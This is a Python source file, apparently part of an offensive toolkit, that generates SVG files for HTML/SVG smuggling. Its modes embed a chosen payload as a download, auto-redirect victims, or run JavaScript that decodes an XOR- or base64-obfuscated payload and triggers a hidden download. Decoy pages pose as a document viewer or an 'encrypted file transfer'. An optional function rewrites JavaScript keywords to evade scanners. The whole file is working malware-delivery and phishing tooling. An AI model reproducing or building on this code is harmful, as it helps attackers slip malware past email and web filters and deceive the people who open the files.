import os
import base64
import html
from config import OUTPUT_DIR


def encode_file_to_base64(file_path):
    """读取文件并返回 Base64 编码字符串"""
    with open(file_path, "rb") as f:
        return base64.b64encode(f.read()).decode()



class SVGGenerator:
    def process_image(self, image_source):
        """
        Processes image source:
        - If local file, returns Data URI (base64)
        - If URL, returns URL
        - If empty, returns placeholder
        """
        if not image_source:
             return "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjVmNWY1Ii8+PHRleHQgeD0iNTAwIiB5PSIyMDAiIGZvbnQtc2l6ZT0iMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkltYWdlIFBsYWNlaG9sZGVyPC90ZXh0Pjwvc3ZnPg=="
        
        if os.path.exists(image_source):
            try:
                b64_data = encode_file_to_base64(image_source)
                ext = os.path.splitext(image_source)[1].lower()
                mime_map = {
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.png': 'image/png',
                    '.gif': 'image/gif',
                    '.bmp': 'image/bmp'
                }
                mime_type = mime_map.get(ext, 'image/jpeg')
                return f"data:{mime_type};base64,{b64_data}"
            except Exception as e:
                raise Exception(f"Failed to process local image: {str(e)}")
        elif image_source.startswith(('http://', 'https://')):
            return image_source
        else:
            raise ValueError("Invalid image source (must be a local file path or http/https URL).")

    def generate(self, mode, params, save_path=None):
        """
        Generates SVG file based on mode.
        params: dict containing required parameters for the mode
        save_path: optional, if not provided will use default in outputs/
        """
        try:
            svg_content = ""
            
            # Common parameters
            click_text = params.get('click_text', "安全扫描完成，请点击下载")
            click_text_escaped = html.escape(click_text)

            if "点击下载模式" in mode and "JS" not in mode:
                payload_path = params.get('payload_path')
                download_filename = params.get('download_filename')
                image_source = params.get('image_source')

                if not payload_path or not os.path.exists(payload_path):
                    raise ValueError("Payload file not found.")
                if not download_filename:
                    raise ValueError("Download filename is required.")

                payload_b64 = encode_file_to_base64(payload_path)
                payload_data_uri = f"data:application/octet-stream;base64,{payload_b64}"
                image_data_uri = self.process_image(image_source)
                download_filename_escaped = html.escape(download_filename)

                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position:fixed;top:0;left:0;">
  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Microsoft YaHei, Arial, sans-serif">{click_text_escaped}</text>
  <a href="{payload_data_uri}" download="{download_filename_escaped}">
    <image href="{image_data_uri}" 
         x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Microsoft YaHei, Arial, sans-serif">点击此处下载文件</text>
  </a>
</svg>'''

            elif "URL 跳转模式" in mode:
                target_url = params.get('target_url')
                image_source = params.get('image_source')

                if not target_url:
                    raise ValueError("Target URL is required.")

                image_data_uri = self.process_image(image_source)
                target_url_escaped = html.escape(target_url)

                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position:fixed;top:0;left:0;">
  <text x="400" y="50" font-size="24" text-anchor="middle" fill="#333333" font-family="Microsoft YaHei, Arial, sans-serif">{click_text_escaped}</text>
  <a href="{target_url_escaped}" target="_blank">
    <image href="{image_data_uri}" 
         x="100" y="80" width="600" height="400" preserveAspectRatio="xMidYMid meet"/>
    <text x="400" y="550" font-size="28" text-anchor="middle" fill="#0066cc" text-decoration="underline" font-family="Microsoft YaHei, Arial, sans-serif">点击此处打开链接</text>
  </a>
</svg>'''

            elif "直连跳转模式" in mode:  # Auto Redirect
                target_url = params.get('target_url')
                if not target_url:
                    raise ValueError("Target URL is required.")
                
                target_url_escaped = html.escape(target_url)
                
                svg_content = f'''<svg width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice"
     xmlns="http://www.w3.org/2000/svg"
     style="position:fixed;top:0;left:0;" onload="redirect()">
  <rect width="800" height="600" fill="#f5f5f5"/>
  <text x="400" y="290" font-size="16" text-anchor="middle" fill="#999" font-family="Microsoft YaHei, Arial, sans-serif">正在跳转，请稍候...</text>
  <script type="text/javascript">
    // <![CDATA[
    function redirect() {{
        var delay = Math.floor(Math.random() * 301) + 200;
        setTimeout(function() {{
            window.location.href = "{target_url_escaped}";
        }}, delay);
    }}
    // ]]>
  </script>
</svg>'''
            
            elif "JS" in mode or "Smuggling" in mode:
                # SVG JS Smuggling Mode - 独立实现，不依赖 HTMLGenerator
                payload_path = params.get('payload_path')
                download_filename = params.get('download_filename')
                encoding_method = params.get('encoding_method', 'Standard Base64')
                enable_evasion = params.get('enable_evasion', False)
                decoy_mode = params.get('decoy_mode', 'template1')

                if not payload_path or not os.path.exists(payload_path):
                    raise ValueError("Payload file not found.")
                if not download_filename:
                    raise ValueError("Download filename is required.")

                # 读取 payload 并编码
                with open(payload_path, 'rb') as f:
                    payload_data = f.read()

                if encoding_method in ("Reverse + Base64", "反转+Base64"):
                    reversed_data = payload_data[::-1]
                    encoded_data = base64.b64encode(reversed_data).decode()
                    decoder_js = '''
            function _decode(d) {
                var b = atob(d);
                var arr = [];
                for (var i = 0; i < b.length; i++) arr.push(b.charCodeAt(i));
                arr.reverse();
                return new Uint8Array(arr);
            }'''
                elif encoding_method in ("XOR + Base64", "XOR+Base64"):
                    key = os.urandom(16)
                    key_hex = key.hex()
                    encrypted = bytes([payload_data[i] ^ key[i % len(key)] for i in range(len(payload_data))])
                    encoded_data = base64.b64encode(encrypted).decode()
                    decoder_js = f'''
            function _decode(d) {{
                var raw = atob(d);
                var k = "{key_hex}";
                var kb = [];
                for (var i = 0; i < k.length; i += 2) kb.push(parseInt(k.substr(i, 2), 16));
                var out = new Uint8Array(raw.length);
                for (var i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i) ^ kb[i % kb.length];
                return out;
            }}'''
                else:
                    # Standard Base64 (default)
                    encoded_data = base64.b64encode(payload_data).decode()
                    decoder_js = '''
            function _decode(d) {
                var b = atob(d);
                var arr = new Uint8Array(b.length);
                for (var i = 0; i < b.length; i++) arr[i] = b.charCodeAt(i);
                return arr;
            }'''

                download_name_escaped = html.escape(download_filename)

                # 选择诱饵内容
                if decoy_mode == "template2":
                    decoy_svg_content = _get_svg_decoy_template2()
                else:
                    decoy_svg_content = _get_svg_decoy_template1()

                # 构建 JS 走私代码
                smuggling_js = f'''
        (function() {{
            {decoder_js}
            
            var _data = "{encoded_data}";
            var _decoded = _decode(_data);
            var _blob = new Blob([_decoded], {{type: "application/octet-stream"}});
            var _url = URL.createObjectURL(_blob);
            
            var _ns = "http://www.w3.org/1999/xhtml";
            var _a = document.createElementNS(_ns, "a");
            _a.href = _url;
            _a.download = "{download_name_escaped}";
            _a.style.display = "none";
            
            var _fo = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
            _fo.setAttribute("width", "0");
            _fo.setAttribute("height", "0");
            _fo.appendChild(_a);
            document.documentElement.appendChild(_fo);
            
            setTimeout(function() {{
                _a.click();
                setTimeout(function() {{
                    URL.revokeObjectURL(_url);
                    document.documentElement.removeChild(_fo);
                }}, 500);
            }}, 1000);
        }})();'''

                if enable_evasion:
                    smuggling_js = _apply_keyword_evasion_svg(smuggling_js)

                svg_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100%" height="100%" viewBox="0 0 800 600"
     preserveAspectRatio="xMidYMid slice"
     style="position:fixed;top:0;left:0;">
  
  {decoy_svg_content}
  
  <script type="text/javascript">
  //<![CDATA[
    {smuggling_js}
  //]]>
  </script>
</svg>'''

            # Determine save path
            if not save_path:
                save_path = os.path.join(OUTPUT_DIR, "svg_smuggling.svg")

            with open(save_path, "w", encoding="utf-8") as f:
                f.write(svg_content)
            
            return os.path.abspath(save_path)

        except Exception as e:
            raise Exception(f"Failed to generate SVG: {str(e)}")


def _get_svg_decoy_template1():
    """
    SVG 诱饵模板1：文档预览页面
    """
    return '''
  <!-- 背景 -->
  <rect width="800" height="600" fill="#f5f5f5"/>
  
  <!-- 顶部栏 -->
  <rect x="0" y="0" width="800" height="50" fill="#0078d4"/>
  <text x="20" y="33" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="16" fill="white" font-weight="bold">
    在线文档查看器
  </text>
  <text x="650" y="33" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="rgba(255,255,255,0.8)">
    安全浏览
  </text>
  
  <!-- 文档区域 -->
  <rect x="100" y="70" width="600" height="480" fill="white" rx="4" ry="4"
        style="filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1))"/>
  
  <!-- 文档内容 -->
  <text x="140" y="120" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="18" fill="#333" font-weight="bold">
    季度工作报告
  </text>
  <line x1="140" y1="132" x2="660" y2="132" stroke="#e0e0e0" stroke-width="1"/>
  
  <text x="140" y="165" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
    正在为您准备文档下载...
  </text>
  <text x="140" y="188" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#666">
    文件处理中，请稍候。
  </text>
  
  <!-- 加载动画 -->
  <circle cx="400" cy="310" r="22" fill="none" stroke="#0078d4" stroke-width="3" stroke-dasharray="90" stroke-dashoffset="0">
    <animateTransform attributeType="xml" attributeName="transform" type="rotate"
                      from="0 400 310" to="360 400 310" dur="1s" repeatCount="indefinite"/>
  </circle>
  <text x="400" y="355" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#999" text-anchor="middle">
    正在加载文档...
  </text>
  
  <!-- 底部提示 -->
  <text x="400" y="510" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="11" fill="#999" text-anchor="middle">
    如果下载没有自动开始，请检查您的浏览器下载设置。
  </text>
  <text x="400" y="530" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="10" fill="#bbb" text-anchor="middle">
    此文件经过加密传输，请妥善保管。
  </text>
'''


def _get_svg_decoy_template2():
    """
    SVG 诱饵模板2：安全文件传输页面
    """
    return '''
  <!-- 背景 -->
  <rect width="800" height="600" fill="#1a1a2e"/>
  
  <!-- 中央卡片 -->
  <rect x="175" y="100" width="450" height="400" fill="#16213e" rx="12" ry="12"
        style="filter: drop-shadow(0 4px 20px rgba(0,0,0,0.3))"/>
  
  <!-- 锁图标 -->
  <circle cx="400" cy="175" r="32" fill="none" stroke="#e94560" stroke-width="3"/>
  <rect x="383" y="170" width="34" height="28" fill="#e94560" rx="3" ry="3"/>
  <rect x="388" y="152" width="24" height="24" fill="none" stroke="#e94560" stroke-width="3" rx="12" ry="12"/>
  
  <!-- 标题 -->
  <text x="400" y="245" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="20" fill="#e0e0e0" 
        text-anchor="middle" font-weight="bold">
    安全文件传输
  </text>
  
  <!-- 描述 -->
  <text x="400" y="280" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
    正在为您准备加密文档下载
  </text>
  <text x="400" y="302" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="13" fill="#a0a0a0" text-anchor="middle">
    请稍候，文件正在解密处理中...
  </text>
  
  <!-- 进度条 -->
  <rect x="240" y="340" width="320" height="8" fill="#0f3460" rx="4" ry="4"/>
  <rect x="240" y="340" width="0" height="8" fill="#e94560" rx="4" ry="4">
    <animate attributeName="width" from="0" to="320" dur="3s" fill="freeze"/>
  </rect>
  
  <!-- 百分比 -->
  <text x="400" y="375" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="12" fill="#a0a0a0" text-anchor="middle">
    解密下载中...
  </text>
  
  <!-- 底部提示 -->
  <text x="400" y="440" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="11" fill="#666" text-anchor="middle">
    文件将自动保存到您的下载文件夹
  </text>
  <text x="400" y="462" font-family="Microsoft YaHei, Segoe UI, Arial, sans-serif" font-size="10" fill="#555" text-anchor="middle">
    本次传输采用端到端加密，请勿截图或转发
  </text>
'''


def _apply_keyword_evasion_svg(js_code):
    """对 SVG 中的 JS 代码做关键词规避"""
    replacements = {
        'atob': "window[String.fromCharCode(97,116,111,98)]",
        'Blob': "window[String.fromCharCode(66,108,111,98)]",
        'Uint8Array': "window[String.fromCharCode(85,105,110,116,56,65,114,114,97,121)]",
    }
    for original, replacement in replacements.items():
        js_code = js_code.replace(original, replacement)
    return js_code
